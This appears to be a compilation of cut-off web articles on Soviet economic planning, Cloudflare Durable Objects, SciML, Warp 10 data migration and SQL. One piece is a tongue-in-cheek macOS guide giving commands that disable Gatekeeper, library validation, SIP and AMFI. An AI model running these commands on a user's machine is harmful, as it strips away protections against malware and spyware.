<p><br>Even if the administrators could get the accounting correct, which they couldn’t, their attempts to allocate resources would still be far from optimal. In the steel industry, for example, some factories were better at producing some types of tubes whereas others were better at producing other types of tubes. Since there were thousands of different factories and tube types, it was non-trivial to decide how to best distribute resources and output requirements, and it was not immediately obvious which factories should be expanded and which should be closed down.</p>

<h4>Supply chain optimizations</h4>

<p>In the late 1960’s, a group of economists and computer scientists known as the “optimal planners” began to push for a better way of doing things. The group argued that a technique called <a href="https://www.math.ucla.edu/~tom/LP.pdf">linear programming</a>, invented by <a href="https://en.wikipedia.org/wiki/Leonid_Kantorovich">Leonid Kantorovich</a>, could optimally solve the problems with the supply chain. At a minimum, since the process could be computerized, it would be possible to perform more detailed calculations than could be done by hand, with less dimensionality reduction. But more importantly, linear programming allowed you to optimize arbitrary objective functions given certain constraints. In the case of the supply chain, it showed you how to efficiently allocate resources, identifying efficient factories that should get more input commodities, and inefficient factories that should be shut down.</p>

  <p><strong>Figure 2.</strong> Leonid Kantorovich, inventor of linear programming and winner of the 1975 Nobel Prize in Economics.</p>
</div>

<p><br>The optimal planners had some success here. For example, in the steel industry, about 60,000 consumers requested 10,000 different types of products from 500 producers. The producers were not equally efficient in their production. Some producers were efficient for some types of steel products, but less efficient for other types of steel products. Given the total amount of each product requested, and given the constraints of how much each factory can produce, the goal was decide how much each factory should produce of each type of product. If we simplify the problem by just asking how much each factory should produce without considering how the products will be distributed to the consuming factories, this becomes a straightforward application of the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Optimal Assignment Problem</a>, a well-studied example in linear programming. If we additionally want to optimize distribution, taking into account the distance-dependent costs of shipments from one factory to another, the problem becomes more complicated but is still doable. The problem becomes similar to the <a href="https://www.math.ucla.edu/~tom/LP.pdf">Transportation Problem</a>, another well-studied example in linear programming, but in this case generalized to multiple commodities instead of just one.</p>

<p><img src="https://chris-said.io/assets/steel_tubes.jpg" height="200"></p>

<p>By introducing linear programming, the optimal planners were modestly successful at improving the efficiency of some industries, but their effect was limited. First, political considerations prevented many of the recommendations surfaced by the model from being implemented. Cement factories that were known to be too inefficient or too far away from consumers were allowed to remain open even though the optimal solution recommended that they be closed. Second, since the planners were only allowed to work in certain narrow parts of the economy, they never had an opportunity to propagate their recommendations back in the supply chain, although one could imagine extending the models to do so. Third, and perhaps most importantly, the value of each commodity was set by old-school administrators in an unprincipled way, and so the optimal planners were forced to optimize objective functions that didn’t even make sense.</p>

<h4>Ideas about optimizing the entire economy</h4>

<p>While the optimal planners were able to improve the efficiency of a few industries, they had more ambitious plans. They believed they could use linear programming to optimize the entire economy and outperform capitalist societies. Doing so involved more than just scaling out the supply chain optimizations adopted by certain industries. It involved shadow prices and interest rates, and a few other things I’ll admit I don’t totally understand. But while I don’t really understand the implementation, I feel like the broader goal of the planners is easier to understand and explain:</p>

<p>Basically, in a completely free market, at least under <a href="https://en.wikipedia.org/wiki/Arrow%E2%80%93Debreu_model">certain assumptions</a>, prices are supposed to converge to what’s called a General Equilibrium. The equilibrium prices have a some nice properties. They balance aggregate supply and demand, so that no commodities are in shortage or surplus. They are also <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">Pareto efficient</a>, which means that nobody in the economy can be made better off without making someone else worse off.</p>

<p>The optimal planners thought that they could do better. In particular, they pointed to two problems with capitalism: First, prices in a capitalist society were determined by individual agents using trial and error to guess the best price. Surely these agents, who had imperfect information, were not picking the exactly optimal prices. In …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>A few weeks ago, Cloudflare announced Durable Objects: a <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/">"truly serverless approach to storage and state"</a>, which piqued our interest here at <a href="https://linc.sh/">Linc</a>. We're already big proponents of Cloudflare Workers (Workers is our <a href="https://linc.sh/why-cloudflare">recommended deploy target</a>, after all), so we're always interested in what new capabilities that platform is getting. But it was this section that sounded <em>ideal</em> for solving a particularly annoying UX problem with much less code/infrastructure than we'd assumed we would need (see the <a href="#building-this-without-durable-objects">comparison section</a> at the end).</p><blockquote><em>Historically ... there was no way to control which instance received a request, [so] there was no way to force two clients to talk to the same Worker... Durable Objects change that: </em><strong><em>requests related to the same topic can be forwarded to the same object, which can then coordinate between them, without any need to touch storage</em></strong><em>.</em></blockquote><p>This is a big deal. And, after a few days tinkering, we've been able to successfully deploy our solution to production! In this post we'll talk about the problem we solved, how Durable Objects work, we'll go through the code and what it's like working with them, and then look at just how much work it saved us.</p><blockquote><strong><em>Note:</em></strong><em> Durable Objects are in </em><a href="http://www.cloudflare.com/cloudflare-workers-durable-objects-beta"><em>limited beta</em></a><em>, and "not recommended for production use" (yet). However, our use-case doesn't push any of the </em><a href="https://developers.cloudflare.com/workers/learning/using-durable-objects#limitations-during-the-beta"><em>beta limits</em></a><em> and we're using it to </em><a href="#the-client"><em>progressively enhance</em></a><em> our existing solution, so we've felt safe </em><a href="#demo"><em>deploying it</em></a><em> to production already!</em></blockquote><h2>The problem—streaming build logs</h2><p>While Linc is a product focussed on automating deployments and previewing each commit, a big part of the day-to-day usage is building commits from source into a <a href="https://fab.dev/">FAB</a>, and viewing the logs of that process is a core piece of the product:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fad68c90ccf85995706ac8a_98383039-e31a9580-2043-11eb-89ee-ca0fd3a9481a.png" alt="image"></p></figure><p>When you're first getting set up, or when something changes in your build or goes awry, you can find yourself poring over these logs to find and fix your issue. And so being able to watch them "live", as they're being built, is a useful tool in reducing your feedback loop (and of course Linc is big on <a href="https://linc.sh/blog/bottleneck">reducing feedback loops</a>!). But that turns out to be an annoyingly difficult feature to implement.</p><p>For starters, most of the time a build will start before any clients are watching (but not always e.g. when restarting a build after a config change). In this case, you need to accumulate a partial build log <em>somewhere</em> so it's ready to send it to the first client to connect. And multiple clients might be watching the same build, and disconnect/reconnect at any moment, too. It's not intractable, but it's just complex enough to be tricky.</p><h3>Our current compromise: reuse our existing GraphQL subscriptions</h3><p>Until now, we've taken a pragmatic approach: use GraphQL subscriptions to periodically flush the entire `Build` record, logs included, every few seconds. This actually reuses our existing live-update infrastructure that powers almost every view in the app:</p><figure><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92591d7dddb3a6e3cd2c_Current%20Implementation.png" loading="lazy" alt=""></p></figure><p>So while updates are triggered from DB events, using a GraphQL subscription server in this way gives us an important guarantee: <strong>the clients are <em>always</em> getting the full snapshot of the data that they're interested in</strong>. In other words, <em>any</em> change to a record in the DB results in the client getting a full update of any affected queries from the server—there's no need to manage or merge updates on the client, it can simply replace its local cache with the latest update. It makes a fully live UI <em>much</em> easier to implement, at the expense of some redundant data transfer.</p><p>As a general pattern, it's worked fantastically for us. But to send each log of a current build line-by-line it's way way <em>way</em> too heavy. Not just in terms of sending way more data than necessary, but we'd be absolutely thrashing our Dynamo table &nbsp;<em>even if nobody's watching the logs currently</em>. So, we've taken a compromise: use the existing infrastructure and flush the logs to the DB every ~10 seconds. Most builds take between 2 and 4 minutes so it's only a handful of extra writes, and it feels OK for a stop-gap. We've had an open ticket to build out a dedicated log-streaming solution but the <a href="#building-this-without-durable-objects">amount of additional infrastructure</a> put us off. That is until Durable Objects came along...</p><h2>What are Durable Objects?</h2><blockquote><em>Note: it's worth reading the </em><a href="https://blog.cloudflare.com/introducing-workers-durable-objects/"><em>introductory blog post</em></a><em> to get a background, but this is my best attempt at a TL;DR:</em></blockquote><p>Durable Objects are a way of defining a serverless function as an <strong>instance of a JS class</strong>. They can't be reached by external HTTP requests directly, instead a "normal" (i.e. stateless) Worker creates/accesses instances using their <strong><em>namespace</em></strong> (usually the name of their class) and an <strong><em>id</em></strong>. For a given <strong><em>namespace</em></strong> &amp; <strong><em>id</em></strong>, there will be <strong>exactly one</strong> instance, somewhere in the world, and it can store data. Instances communicate with workers over normal HTTP requests/responses, and support websockets.</p><p>If you find that a bit confusing, you're not alone! I didn't really "get" it until I'd read an example, so I've reproduced and commented our Worker and Object code in <a href="#the-solution">The Solution</a> section below.</p><h3>Durable Objects? "Stateful workers"? "Materialised actors"?</h3><p>I hope it's not terribly controversial, but I'm not a big fan of the name "Durable Objects". It conjures a very data-centric model, where it sounds like a way to... maybe define classes that magically run in the cloud, and where instances... maybe get "frozen" and stored when they go idle? It presents it like a type of database, whereas the reality is much closer to the Worker/Serverless model, just with per-worker storage.</p><p>That said, the phrase "workers with per-worker storage" <em>massively</em> downplays how incredibly transformative this concept is, though, so I get that Cloudflare <em>want</em> it to sound like a "whole new thing". But conceptually, you may be better thinking about these as "materialised <a href="https://en.wikipedia.org/wiki/Actor_model">actors</a>" or, as we've come to coining them internally "stateful workers".</p><p>We'll just call them "Objects" and "instances" in the remainder of this blog post.</p><h3>Instances as a kind of "state"</h3><p>In the documentation, there's a lot of focus on the fact that an Object has its own key-value storage using `controller.storage`. But that API is available only once you have a live <em>instance</em> of an Object, and getting <em>there</em> is actually a whole type of state in disguise.</p><p>The key phrase is <a href="https://blog.cloudflare.com/introducing-workers-durable-objects/#what-is-a-durable-object">here</a>:</p><blockquote><em>Each object has a globally-unique identifier. That object exists in only one location in the whole world at a time. Any Worker running anywhere in the world that knows the object's ID can send messages to it. All those messages end up delivered to the same place.</em></blockquote><p>Combine this with the fact that each Object instance supports websockets, suddenly you can define a system where, as long as two endpoints share some kind of <strong><em>key</em></strong>, they can pass messages directly (kind of the way WebRTC connections are possible when two computers can't talk directly, but can both talk to a <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN server</a>). And it turns out, for Linc to stream live build logs to the browser, that's exactly what we need.</p><h2>The solution</h2><p>We already have an ideal shared key: the git SHA of the current commit being built. We actually use the `tree_id` of the commit, not the commit sha, because a `tree_id` is a hash of <em>only the underlying code</em>, not its history or commit message (an aside: this is how Linc can release instantly when you merge an up-to-date PR, without waiting for a new build).</p><p>The solution has 4 components:</p><figure id="w-node-d2c300e41a9b-86b04042"><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92d434933bbb702fde0a_Cloudflare%20Architecture.png" loading="lazy" alt=""></p></figure><ul role="list"><li>The "normal" Cloudflare <strong>Worker</strong> that receives requests from the client/builder and connects them to the appropriate Object instance.</li><li>The Durable <strong>Object</strong> itself, which maintains a list of current clients, a history of logs, and broadcasts new log entries from the builder to each client.</li><li>The <strong>Builder</strong>, which is the machine in our AWS cluster that runs `npm run fab:build` on the source code. It hasn't needed to change very much, but now sends logs to the Worker as well as saving them to Dynamo. We sometimes call this "build server" or just "server" in the code.</li><li>The <strong>Client</strong>, which is our normal React app, that needs to reconcile "live" logs from the Worker with the existing data from GraphQL.</li></ul><h3>The Worker</h3><p>It's fair to say that this is the piece that I was most confused about after reading the <a href="https://developers.cloudflare.com/workers/learning/using-durable-objects">guide</a>. It feels like you should just be able to deploy the Object itself and talk to it directly, but the Worker layer makes a lot of sense once it fits into the bigger picture: it's the only way <strong><em>clients</em></strong> (who talk HTTP to their nearest edge location) can talk to <strong><em>Object instances</em></strong> (which run in exactly one place worldwide). </p><p>The simplest possible Worker would look like this:</p><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;// Convert our key into a Object ID<br> &nbsp; &nbsp;const id = env.MyObjectNamespace.idFromName('some-fixed-value')<br> &nbsp; &nbsp;// Connect to that instance, booting it if necessary<br> &nbsp; &nbsp;const instance = await env.MyObjectNamespace.get(id)<br> &nbsp; &nbsp;// Forward the current HTTP request to it<br> &nbsp; &nbsp;return instance.fetch(request)<br> &nbsp;}<br>}</p><p>Note that this worker uses a single key for all requests (<em>`'some-fixed-value'`</em>) which means <em>_</em>every<em>_ </em>request would be directed to a <em>_</em>single Object instance<em>_</em>. This is almost certainly not what you want in production, but it was handy when getting started (particularly if you change <em>`'some-fixed-value'` </em>once or twice, so you can be sure you're getting a new instance from the last time you deployed).</p><p>Our Worker isn't actually much more complex, but parses the route to find the <em>`tree_id` </em>to direct all requests for a particular build to a shared instance:</p><div><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;const { pathname } = new URL(request.url)</p><p> &nbsp; &nbsp;// Pro tip: put the parsing of the route in a static method on the Object so you can use it in both places<br> &nbsp; &nbsp;// (note: the Worker and Object have to be in the same file to share the helper function)<br> &nbsp; &nbsp;const route = DurableBuildLog.toRouteParams(pathname)<br> &nbsp; &nbsp;if (!route.match) return notFound()</p><p> &nbsp; &nbsp;// Validate that the Client has access to this Site's build logs<br> &nbsp; &nbsp;if (route.client) {<br> &nbsp; &nbsp; &nbsp;if (!await clientHasAccess(route.sitename, request.headers)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;return notAuthorized()<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp;}</p><p> &nbsp; &nbsp;// Validate that the Build Server is …</p></div></div></div></div></div>

What is your background? what is your current position?</h2><p id="dea8">I am an applied mathematics instructor at MIT, the Director of Scientific Research at Pumas-AI, and a senior research analyst at the University of Maryland, School of Pharmacy. My background is numerical differential equations and systems biology, where my PhD was in new methods for efficient solving of stochastic differential equations to model the control of randomness in the developing zebrafish hindbrain.</p><h2 id="ba5c">What is SciML? Why was it born and what’s its purpose?</h2><p id="57c0">Before the “SciML” organization, there was just DifferentialEquations.jl and JuliaDiffEq, but it grew beyond just a single project. There were methods for symbolically manipulating equations, sparse automatic differentiation, automated model discovery, neural PDE solvers, and even packages in Python and R for using these tools. So the name didn’t fit and we did a reorganization around the central principle: scientific machine learning. Scientific machine learning is a burgeoning field that mixes scientific computing, like differential equation modeling, with machine learning. That is the essence of the organization: many tools for scientific simulation with differential equation solvers, chemical reaction network tools and N-body simulators, but all of them can compose with machine learning.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1920/1*YtKzMw7VOvNbOCsOkXwU0A.png" width="960" height="750" srcset="https://miro.medium.com/max/552/1*YtKzMw7VOvNbOCsOkXwU0A.png 276w, https://miro.medium.com/max/1104/1*YtKzMw7VOvNbOCsOkXwU0A.png 552w, https://miro.medium.com/max/1280/1*YtKzMw7VOvNbOCsOkXwU0A.png 640w, https://miro.medium.com/max/1400/1*YtKzMw7VOvNbOCsOkXwU0A.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*YtKzMw7VOvNbOCsOkXwU0A.png?q=20"></p></div></div></div></figure><h2 id="a3cb">Scientific Computing and Machine Learning are often perceived as very different areas. What would you say are the strengths and weaknesses of each one and how does SciML take advantage of them?</h2><p id="5be4">Scientific computing generally requires a lot of prior knowledge about the system. You need to be able to create a “mechanistic model”, which requires knowing the physical laws, the chemicals which react, or other way to mathematically encode each interaction of the system. If you know this, great! Then you have a very predictive model. You might know all of the chemicals which interact but not know the reaction rates, and then 12 data points can turn this into quite a predictive model. So these models are interpretable (since it’s all about the mechanism), data efficient, etc. They are great at extrapolating too: the theory of gravity gives pretty good predictions for what happens on Earth as it does for the solar system as it does for galaxies.</p><p id="4d96">Data-driven modeling, like machine learning, takes a completely opposite approach of being “data first”. You have a non-mechanistic model, and you “train” the model based on the data. This requires a lot of data, but you can do this even when you have no idea what the mechanism is. What’s the mechanism for what movie someone will want to watch next on Netflix given the previous movies they’ve seen? Einstein didn’t have a theory for that! But with big data, you can generate such a model.</p><p id="66df">Scientific machine learning is about pairing together these two paradigms. Incorporating mechanism into machine learning makes it more interpretable, more data efficient, and better able to predict beyond the training data, all without requiring that you know all of the mechanisms. We’re using this in cases like pharmacometrics, where in the first clinical trial we may not know everything about how the drug works, but we can start with a pretty good guess by using mechanistic models derived for similar drugs, and use the incoming data to train models which transforms the prior model towards the data.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1836/1*ihyMT0ujkdDopf3M8eiXUw.png" width="918" height="746" srcset="https://miro.medium.com/max/552/1*ihyMT0ujkdDopf3M8eiXUw.png 276w, https://miro.medium.com/max/1104/1*ihyMT0ujkdDopf3M8eiXUw.png 552w, https://miro.medium.com/max/1280/1*ihyMT0ujkdDopf3M8eiXUw.png 640w, https://miro.medium.com/max/1400/1*ihyMT0ujkdDopf3M8eiXUw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ihyMT0ujkdDopf3M8eiXUw.png?q=20"></p></div></div></div></figure><h2 id="d94b">What are Neural ODEs? When is it appropiate to work with one? Do you fear that accuracy or interpretability is lost by introducing a Neural Network as part of the equation? Aren’t there other learning methodologies suited for such a thing?</h2><p id="0b2b">Neural Ordinary Differential Equations or Neural ODEs are ordinary differential equations defined by a neural network. Indeed the result is less interpretable than having a mechanistic physical model, but it allows for the model to be learned directly from data. The neural network makes it not just estimating parameters, but estimating functions. As a middle ground, we created the <a href="https://arxiv.org/abs/2001.04385" rel="noopener">universal differential equation</a> which is a partially mechanistic model where the neural networks fill in areas of the model which are unknown or have a lot of uncertainty. In this sense, there is more of a continuum between the data-driven and mechanistic models.</p><h2 id="29cd">Currently, there exist many differential equations solvers, why do you think this is the case? Is there a way to choose the best one for each situation?</h2><p id="1230">We created an automated algorithm chooser in order to mitigate this issue. If you do 'solve(prob)' (i.e. don’t specify a solver algorithm), it will choose one for you. Then you can give it hints to go down different branches. As time goes on I think we will keep refining that algorithm and pushing more people towards that.</p><h2 id="46c4">What are the key reasons the SciML Differential Equations solver is so fast? How does it differ from others? How influential was writing it in Julia?</h2><p id="1393">Every differential equation solver specializes on some aspect of the differential equation, giving them different performance aspects. For example, BDF integrators, “the standard” for stiff equations, use values from past steps. This can speed things up if the equation is not too stiff, but if it’s too stiff then you cannot use a high order (known as the Dahlquist barrier) and it slows down. So it’s problem dependent as to how well it can mitigate numerical issues, which means for some problems it’s fast and in others it breaks down. Then, if you have discontinuities which are frequent, like dosing in pharmacometrics simulations, this also requires order reduction and thus makes this particular method slower. DifferentialEquations.jl has about 300 methods when you consider all of the tableaus across not just ODEs but also SDEs, DAEs, and DDEs, and it’s this collection that allows it to be efficient.</p><h2 id="bd12">Regarding the importance of being able to quantify the uncertainty of the numerical resolution when solving differential equations, how does SciML address this problem?</h2><p id="dd62">DifferentialEquations.jl comes with a module DiffEqUncertainty.jl that gives sampling-based estimates of numerical uncertainty by causing jitter on the order of the error estimates calculated on each step. Normally these error estimates are only used for adapting dt, but this gives a way to get essentially a free estimate of what other possible paths look like. Andrew Stuart’s group at CalTech then has a full publication that describes that this method indeed matches the error distribution of the full solve. So if you run this a hundred times you’ll get a sense of what all of the possible trajectories could’ve been given the error tolerance that you allowed.</p><h2 id="0bec">What are MultiScaleArrays? In what ways do these data structures help us in simulating complex scientific models?</h2><p id="853b">The differential equation solvers, and actually all of the SciML ecosystem, work on abstract interfaces which allow for the concrete implementation of a type to be radically different from the standard implementation. MultiScaleArrays is a nice example of this where an entire multi-scale model is represented as both a graph structure and an array simultaneously. This lets the user write a model like “for every cell in the lung, do the chemical reactions of a lung cell” to define a model, but have the stiff high-performance ODE solver automatically know how to interact with this object. It’s not even an array: it’s an array of arrays of arrays etc., which acts like an array. In this form it’s very efficient to allows cells to divide and die, and the ODE solver will adapt the size of the solution vector automatically as this changes.</p><p id="a8a3">While this was made for the specific case of multi-scale biological modeling in mind, other users have since come up with other great examples. CuArrays are CUDA-accelerated arrays that live on the GPU that can be dropped in as a replacement to the standard array, or ComponentArrays.jl defines an array type similar to MultiScaleArrays which is backed by a real vector, so it’s faster for standard computations but slower for size changes. A lot of new features can thus be directly added and optimized in the ODE solver just by changing the input types!</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2576/1*crRcFtHznAsYXDCb1uh4oQ.png" width="1288" height="878" srcset="https://miro.medium.com/max/552/1*crRcFtHznAsYXDCb1uh4oQ.png 276w, https://miro.medium.com/max/1104/1*crRcFtHznAsYXDCb1uh4oQ.png 552w, https://miro.medium.com/max/1280/1*crRcFtHznAsYXDCb1uh4oQ.png 640w, https://miro.medium.com/max/1400/1*crRcFtHznAsYXDCb1uh4oQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*crRcFtHznAsYXDCb1uh4oQ.png?q=20"></p></div></div></div></figure><h2 id="0473">Are the processes of solving differential equations and training a Neural Networks similar? How do you put together both frameworks?</h2><p id="e4ec">Training a neural network is solving an ODE defined by the gradient of the loss function until zero. Solving that ODE with Euler’s method is gradient descent. So you could use an ODE solver as the algorithm for training a neural ODE, and there is a use case that we’re looking into for that. Differential equations are more ubiquitous than I think most people realize.</p><h2 id="a904">Is GPU computing integrated in the SciML ecosystem? How important is having this feature to a scientific computing framework nowadays?</h2><p id="48c3">Yes, there’s two major ways. …</p></div></div></section></div>

First, ask yourself, would you like to undo a decade of security protections painstakingly created by Apple, protecting your Mac from malware, spyware, and ransomware? What if these so-called <em>protections</em> prevented the normal and speedy usage of your Mac? See exhibits: [<a href="https://news.ycombinator.com/item?id=25074959">A,</a> <a href="https://news.ycombinator.com/item?id=23273247">B,</a> <a href="https://github.com/microsoft/vscode/issues/105446#issuecomment-722264044">C,</a> <a href="https://github.com/johnboiles/obs-mac-virtualcam/wiki/Compatibility#sip-workaround">D,</a> <a href="https://github.com/MacEnhance/MacForge">E,</a> <a href="https://lapcatsoftware.com/articles/unsigned.html">F</a>]</p>
<p>Is that a yes? <strong>Speed and convenience over security any day!</strong> Let us march on boldly 😃! The steps listed below will give you a short description of each protection we disable, and the necessary command in Terminal.</p>
<h4 id="stepbystepguide">Step-by-step Guide</h4>
<p><strong>Step 1: Disable GateKeeper.</strong> This is the part of macOS that deals with code signature validation. It checks if the app in question was signed by the creator, and then checks whether Apple has given the creator a thumbs-up. macOS 10.15 made this much more stringent, requiring Apple to give <em>each app</em> a thumbs-up.</p>
<pre><code>sudo spctl --master-disable
</code></pre>
<p><strong>Step 2: Disable Library Validation.</strong> This protection checks if an app's libraries are signed by Apple or the creator. Until very recently, macOS apps could load code freely from foreign sources called <em>code libraries</em>. With macOS 10.15, apps are no longer allowed to load libraries that weren't originally packaged with it, unless they explicitly allow it.</p>
<pre><code>sudo defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true
</code></pre>
<p><strong>Step 3: Disable System Integrity Protection.</strong> <em>You have to enter Recovery Mode (by holding Command+R while rebooting) in order to disable SIP. This mode lets us change boot data for the Mac.</em> SIP prevents both malware and power-users alike from modifying the system files, core apps, and the kernel of macOS. It does this by only allowing apps and extensions signed by Apple to modify the system.</p>
<pre><code># From the Recovery Mode menubar: Utilities --&gt; Terminal
csrutil disable
</code></pre>
<p><strong>Step 4: Disable Apple Mobile File Integrity.</strong> AMFI is the macOS kernel module that enforces the code-signing validation from Step 1 and the library validation from Step 2. However, even after disabling the services above, AMFI is still checking the signatures of every app that is run, and will cause non-Apple apps to crash when they touch extra-sensitive areas of the system.</p>
<pre><code># While still in Recovery Mode
nvram boot-args="amfi_get_out_of_my_way=1"
</code></pre>
<p><strong>Step 5: Reboot &amp; Enjoy Liberty.</strong> No explanation required.</p>
<h4 id="caveats">Caveats:</h4>
<ul>
<li>If GateKeeper is enabled while AMFI is disabled, some apps will hang while opening.</li>
<li>If AMFI is disabled, prompts to allow apps access to the camera, microphone, accessibility etc. will not be shown. The <code>tccplus</code> utility, found <a href="https://github.com/jslegendre/tccplus">here</a>, alleviates this (there is a GUI script in the repo).</li>

November 13, 2020 | https://blog.senx.io/warp-10-migration/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/warp-10-migration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Migration of 38TB of data from a Warp 10 server to another. How can you do this? Is it more complex than migration of a 38TB SQL database?</p><article>
      
<p>The migration of a database from a server to a new one can be painful. </p>



<p>Recently, this article describing <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">how to migrate a 40TB SQL database</a> to another SQL database caught my attention. </p>



<p>It took the author huge efforts to migrate what looks like time series (HAProxy traffic logs). Using <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> in the same situation, migration would have been a lot simpler.</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg" alt="infographic about the migration from a Warp 10 database to another one" width="553" height="232" srcset="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg 722w, https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate-300x126.jpg 300w" sizes="(max-width: 553px) 100vw, 553px"></figure></div>



<h2>The plot</h2>



<p>For years, you are storing data on a Warp 10 standalone version. You reached the limit of the disk space, there is just a few TB remaining on 40TB. You do not want to delete anything. For this application, you just have one token.</p>



<pre>host: oldserver
Warp 10 port: 8080
read token: OldReadToken</pre>



<p>You bought 10 new servers, and you decided to jump to Warp 10 distributed version. Everything is ready for production.</p>



<pre>ingress host: newserver
Warp 10 port: 8080
write token: NewWriteToken</pre>



<h2>The migration</h2>



<p><strong>1/</strong> Redirect your traffic log output to the new server. </p>



<p><strong>2/</strong> If there are not on the same network, set a tunnel between the old server and the new one. The most bandwidth the better.</p>



<p><strong>3/</strong> Launch curl:</p>



<pre><code>curl  -H 'X-Warp10-Token: OldReadToken' "http://oldserver:8080/api/v0/fetch?start=1970-01-01T00%3A00%3A00.000Z&amp;stop=2020-11-16T00%3A00%3A00.000Z&amp;selector=~.*%7B%7D&amp;format=text&amp;dedup=false" | curl -T - -H 'Transfer-Encoding: chunked' -H 'X-Warp10-Token: NewWriteToken' 'http://newserver:8080/api/v0/update'</code></pre>



<p>Basically, read all from 1970 to now, and push it to the new server. </p>



<blockquote><p>You do not need any extra disk space. You do not need a lot of RAM either, thanks to chunking. </p></blockquote>



<p><strong>4/</strong> Wait...</p>



<p>During my tests between two old computers on my local network, with 7GB in LevelDB directory, it took 50 minutes to output 36GB, at a 12MB/s speed. WiFi was not the limit.</p>



<pre>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 36.3G    0 36.3G    0     0  12.2M      0 --:--:--  0:50:33 --:--:-- 11.2M</pre>







<p>On a gigabit network, the limit may be your old server output. Depending on your hardware, you will surely reach 50MB/s. </p>



<p>Let's extrapolate:</p>



<figure><table><tbody><tr><td></td><td>Small test</td><td>Serious one</td></tr><tr><td>LevelDB size</td><td>7GB</td><td>38TB</td></tr><tr><td>Datapoints</td><td>575M</td><td>~3.1 T</td></tr><tr><td>Text size</td><td>36GB</td><td>~194TB</td></tr><tr><td>Curl speed</td><td>12.2MB/s</td><td>~50MB/s</td></tr><tr><td>Time</td><td>50 minutes</td><td>~45 days</td></tr><tr><td></td><td></td><td></td></tr></tbody></table></figure>



<p>In my test dataset, there is a lot of <strong><a href="https://blog.senx.io/working-with-geo-data-in-warp-10/" target="_blank" rel="noreferrer noopener">geo time series</a></strong>, with location and elevation. <strong>Your data may be denser, and it will take less than 45 days with just a curl command</strong>. You may cut time in half and use two threads to do the migration. With spinning disks, more thread will increase seeking time anyway. </p>



<p>Now, read <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">the article</a> that retains my attention... 40 TB SQL database to move: <strong>11-month project. Tons of specific scripts. Lots of development hours.</strong> 8437 words in the blog article. 40 min estimated time to read the article!</p>



<h2>Q/A</h2>



<p><em><strong>Q:</strong> I have several tokens on my database!</em></p>



<p><strong>A:</strong> Assuming you also recreated tokens on your new server, iterate on them in a curl. If your new server shares the same secrets, the tokens will be the same, and migration will be easier. If you are <a href="https://blog.senx.io/all-there-is-to-know-about-warp-10-tokens/" target="_blank" rel="noreferrer noopener">familiar with tokens</a>, you can create some super read/write tokens too.</p>







<p><em><strong>Q:</strong> I want to migrate Warp 10 standalone to another Warp 10 standalone, not to a distributed one!</em></p>



<p><strong>A</strong>: Copy all Warp 10 files from the old server to the new one using Rsync. Then stop the old server. run rsync again (it should take just a few minutes). Start Warp 10 on the new server. Enjoy. </p>







<p><em><strong>Q:</strong> I don't want any service interruption!</em></p>



<p><strong>A:</strong> <a href="https://senx.io/contact" target="_blank" rel="noreferrer noopener">Contact us</a>. There are some solutions.</p>







<p><em><strong>Q:</strong> Bandwith is an issue for me. Can't we compress text?</em></p>



<p><strong>A:</strong> Sure you can! Pipe output to gzip before piping to the second curl, and add the correct content-type header to the second curl: <code>-H 'Content-Type: application/gzip'</code>. </p>







<h2>Conclusion</h2>



<p>I feel your disappointment. Just a little 600 words article. There is not even a complex WarpScript or a huge shell script to explain. I am sorry. The migration of Warp 10 to Warp 10 is just too simple.</p>

<![CDATA[SQL as Sculpture – An Intuitive Way to Understand Queries]]>

November 13, 2020 | https://www.srsoterica.com/articles/database/sql_as_sculpture | <a href="https://web.archive.org/web/*/https://www.srsoterica.com/articles/database/sql_as_sculpture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>


<p>
If you look at it from the right perspective - from way up high - you can say that sculpting, the activity of creating a sculpture, is about just two things:
</p>


<ol>
<li>Assembling a mass of material (aka your medium)</li>
<li>Carving that material down</li>
</ol>


<p>
Okay.  Maybe that's a little too high, a little too abstract.  
How about if we zoom in <em>just a bit</em> closer...  
</p>



<p>
A sculpture is often made of clay.  
Depending on how large you intend your sculpture to be, you might be able to find a single clay block big enough to suit your need.  
But if you can't - if you need a block that's larger than that - then you need to do two things:
</p>

<ol>
<li>acquire multiple blocks</li>
<li>mush all of those blocks together as a single (larger) block</li>
</ol>


<p>
After you have assembled your block(s), you will use a variety of tools to carve, or whittle the block down.  
You start with coarser tools that carve off big chunks.  
You work your way toward more delicate tools that make barely perceptible refinements.  
